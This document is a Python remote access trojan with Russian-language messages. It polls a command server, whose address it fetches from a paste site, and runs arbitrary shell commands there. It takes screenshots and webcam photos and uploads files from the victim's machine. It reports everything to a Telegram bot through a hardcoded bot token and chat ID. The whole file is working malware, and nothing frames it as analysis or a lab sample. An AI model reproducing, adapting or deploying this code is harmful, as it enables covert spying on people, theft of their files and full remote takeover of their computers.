import requests, random, platform
import subprocess, string
import io, os, time, cv2, numpy as np
import pyautogui, logging
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(module)s - %(message)s", level=logging.INFO)

TOKEN = '7539990102:AAFCEwvXc2yzf-FUD-UD8vH_uHM1Vfoo_NA'
CHAT_ID = 1320559926
server = ''
key = ''.join( random.choice(string.ascii_lowercase+string.ascii_uppercase+string.digits) for i in range(4) )
handle_key = ''

def actual_server():
    global server
    url = 'https://text-host.ru/raw/bez-zagolovka-13596'
    timeout = 30
    while True:
        try:
            r = requests.get(url).text.strip()
            if r == 'exit':
                send_tg(f"❌ Программа закрыта: 🔑{key}")
                exit(0)
            test = requests.get(r).text
            if 'Session not Found! ((' in test:
                print(f"[!] Session not found, Please update URL.")
                send_tg(f"[! SPAM] 🔑{key} -> Сессия не найдена. \n🔎 HOST: {url} \nTimeOut: {timeout}")
                time.sleep(timeout)
                timeout += timeout * 1.5
                timeout = np.clip(timeout, 30, 240)
                continue
            
            old = server
            server = r
            if old != r:
                return True
            break
        except Exception as e:
            print(f"[!] Error in Server: {e}")


def read_cmd():
    global server
    data = requests.get(server+'/c').text
    logging.info(data)
    if 'Session not Found! ((' in data:
        print(f"[!] Session not found, Please update URL.")
        actual_server()
    body = data.split("|")

    if len( body ) == 3 and body[0] == key:
        return body[0], body[1], body[2]  # key, mode, cmd
    elif len( body ) == 3 and body[0] == "any": # send to all
        return body[0], body[1], body[2]  # key, mode, cmd
    else:
        return "", "", ""
    
def clear_cmd():
    global server
    global handle_key

    print(handle_key)
    if handle_key == 'any': return
    requests.post(server+'/c', data="")

def send_result(body: str):
    global server
    
    requests.post(server+'/r', data=body)
    clear_cmd()

def send_msg_tg(msg: str):
    token, chatid = TOKEN, CHAT_ID
    requests.get(f'https://api.telegram.org/bot{token}/sendMessage', data={
        'chat_id': chatid,
        'text': msg
    })
    clear_cmd()

def send_tg(msg: str):
    token, chatid = TOKEN, CHAT_ID
    requests.get(f'https://api.telegram.org/bot{token}/sendMessage', data={
        'chat_id': chatid,
        'text': msg
    })

def send_photo_tg(photo: io.BytesIO, caption: str):
    token, chatid = TOKEN, CHAT_ID
    url = f'https://api.telegram.org/bot{token}/sendPhoto'
    data = {'chat_id': chatid, 'caption': caption}
    files = {'photo': photo}
    requests.post(url, data=data, files=files)
    clear_cmd()

def send_audio_tg(pathtoaudio: str, caption: str):
    token, chatid = TOKEN, CHAT_ID
    url = f'https://api.telegram.org/bot{token}/sendAudio'
    data = {'chat_id': chatid, 'caption': caption}
    with open(pathtoaudio, 'rb') as f:
        files = {'audio': f}
        requests.post(url, data=data, files=files)
    os.remove(pathtoaudio)
    clear_cmd()

def send_file_tg(PathToFile: str, caption: str):
    url = f'https://api.telegram.org/bot{TOKEN}/sendDocument'
    data = {'chat_id': CHAT_ID, 'caption': caption}
    with open(PathToFile, 'rb') as f:
        files = {'document': f}
        requests.post(url, data=data, files=files)
    clear_cmd()


def screenshot():
    print(f"[/] Making screenshot...")
    if platform.system() == 'Windows':
        img = pyautogui.screenshot(allScreens=True)
    else:
        img = pyautogui.screenshot()
    buf = io.BytesIO(); img.save(buf, format="PNG"); buf.seek(0)
    send_photo_tg(buf, f'💻 Скриншот от {key}')
    print(f"[*] Скриншот отправлен в  @tgbotforscreenshots_bot")

def webcam():
    print(f"[/] Making photo...")
    cap = cv2.VideoCapture(0)
    _, frame = cap.read()
    _, buf = cv2.imencode('.jpg', frame)
    send_photo_tg(buf, f'📷 Вебкамера с {key}')
    print(f"[*] Фото отправлено в @tgbotforscreenshots_bot")

def volume(value: int):
    print(f"[/] Changing Volume...")
    try: value = int(value)
    except:
        send_msg_tg(f"🔊 [{key}] Вы не указали громкость/только цифры")
    if value > 0:
        pyautogui.press('volumeup', presses=value)
    elif value <= 0:
        pyautogui.press('volumedown', presses=100)
    else:
        send_msg_tg(f"🔊 [{key}] Вы не указали громкость/только цифры")
    clear_cmd()
    print(f"[*] Changing Volume Done!")

if __name__ == "__main__":
    send_tg(f"✨ Новое конект! \n🔑 Публичный Ключ: {key} \n📰 Скоро придет уведомление с информацией.")
    while True:
        try:
            if actual_server():
                send_msg_tg(f'🔑 Публичный Ключ: {key} \n🔎 Используемый Url: {server}')
                print(f'[?] 🔑 Public Key: {key}')
                print(f'[?] 🔎 Target url: {server}')
            hkey, mode, cmd = read_cmd()
            if cmd == "": 
                time.sleep(0.5)
                continue
            handle_key = hkey

            if mode == 'main':
                if cmd == 'exit':
                    print(f"[*] Exit program, bye?")
                    send_msg_tg(f"❌ Программа закрыта: {key}")
                    break
                elif cmd == 'sess':
                    send_msg_tg(f'🔑 Публичный Ключ: {key} \n🔎 Используемый Url: {server}')
                    print(f'[?] 🔑 Public Key: {key}')
                    print(f'[?] 🔎 Target url: {server}')

                elif cmd == 'screenshot':
                    screenshot()
                elif cmd == 'webcam':
                    webcam()
                
                elif 'volume' in cmd:
                    try: 
                        cwd = cmd.split(" ")[1]
                        volume(cwd)
                    except:
                        send_msg_tg(f"🔊 [{key}] Вы не указали громкость.")
                
                elif 'download' in cmd:
                    try: 
                        cwd = cmd.split(" ")[1]
                        send_file_tg(cwd, f"🔑: {key} \nФайл ('{cwd}') скачен.")
                    except:
                        send_msg_tg(f"🔑: {key} Вы не указали файл.")

                    
                    
            elif mode == 'shell':
                print(f"[/] Exec command: {cmd}...")
                p = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                send_result(f"{p.stdout} \n{p.stderr}")
                send_msg_tg(f"📁 [{key}] \nВывод: {p.stdout} \nОшибки: {p.stderr}")
                print(f"[*] Result send.")
            
            
            time.sleep(2)
            


        except Exception as err:
            try: send_msg_tg(f"‼ [{key}] Ошибка: {err}")
            except: send_tg(f"‼ [{key}] Ошибка: {err}")
            print(f"[!] Error: {err}")
